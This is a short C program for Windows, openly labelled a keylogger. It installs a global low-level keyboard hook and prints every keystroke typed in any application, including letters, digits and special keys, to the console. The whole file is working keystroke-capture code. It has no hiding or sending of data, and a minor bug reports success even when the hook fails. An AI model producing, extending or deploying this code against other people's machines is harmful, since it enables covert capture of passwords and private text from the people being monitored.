#include <windows.h>
#include <stdio.h>

LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam)
{
    // Log keyboard events
    KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *) lParam;

    if (wParam == WM_KEYDOWN)
    {
        switch (pkey->vkCode)
        {
        case VK_BACK:
            printf("(BACKSPACE)");
            break;
        case VK_RETURN:
            printf("(ENTER)");
            break;
        case VK_SPACE:
            printf("(SPACE)");
            break;
        case VK_TAB:
            printf("(TAB)");
            break;
        case VK_SHIFT:
            printf("(SHIFT)");
            break;
        case VK_LSHIFT:
            printf("(LSHIFT)");
            break;
        case VK_RSHIFT:
            printf("(RSHIFT)");
            break;
        case VK_CONTROL:
            printf("(CTRL)");
            break;
        case VK_MENU: // Alt key
            printf("(ALT)");
            break;
        case VK_CAPITAL:
            printf("(CAPSLOCK)");
            break;
        case VK_ESCAPE:
            printf("(ESC)");
            break;
        case VK_LEFT:
            printf("(LEFT ARROW)");
            break;
        case VK_RIGHT:
            printf("(RIGHT ARROW)");
            break;
        case VK_UP:
            printf("(UP ARROW)");
            break;
        case VK_DOWN:
            printf("(DOWN ARROW)");
            break;
        case VK_DELETE:
            printf("(DELETE)");
            break;
        case VK_HOME:
            printf("(HOME)");
            break;
        case VK_END:
            printf("(END)");
            break;
        case VK_PRIOR: // Page Up
            printf("(PAGE UP)");
            break;
        case VK_NEXT: // Page Down
            printf("(PAGE DOWN)");
            break;
        case VK_INSERT:
            printf("(INSERT)");
            break;
        case VK_LWIN:
            printf("(LEFT WINDOWS)");
            break;
        case VK_RWIN:
            printf("(RIGHT WINDOWS)");
            break;
        case VK_NUMPAD0:
        case VK_NUMPAD1:
        case VK_NUMPAD2:
        case VK_NUMPAD3:
        case VK_NUMPAD4:
        case VK_NUMPAD5:
        case VK_NUMPAD6:
        case VK_NUMPAD7:
        case VK_NUMPAD8:
        case VK_NUMPAD9:
            printf("(NUMPAD%d)", pkey->vkCode - VK_NUMPAD0);
            break;
        case VK_MULTIPLY:
            printf("(NUMPAD *)");
            break;
        case VK_ADD:
            printf("(NUMPAD +)");
            break;
        case VK_SUBTRACT:
            printf("(NUMPAD -)");
            break;
        case VK_DIVIDE:
            printf("(NUMPAD /)");
            break;
        case VK_NUMLOCK:
            printf("(NUMLOCK)");
            break;
        default:
            if (pkey->vkCode >= 0x30 && pkey->vkCode <= 0x39) // Numbers 0-9
            {
                printf("%c", pkey->vkCode);
            }
            else if (pkey->vkCode >= 0x41 && pkey->vkCode <= 0x5A) // Letters A-Z
            {
                printf("%c", (pkey->vkCode + 32)); // Convert to lowercase
            }
            else
            {
                printf("(UNKNOWN: %d)", pkey->vkCode);
            }
            break;
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}


int main()
{
	printf("Hello Windows Keylogger\n");
	HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
	if (hhook == NULL)
		printf("Hook wasn't installed\n");
	printf("Hook was installed\n");
	
	// Start the message loop. 
	MSG msg;
	while( (GetMessage( &msg, NULL, 0, 0 )) != 0)
	{ 
		TranslateMessage(&msg); 
		DispatchMessage(&msg); 
	} 
}
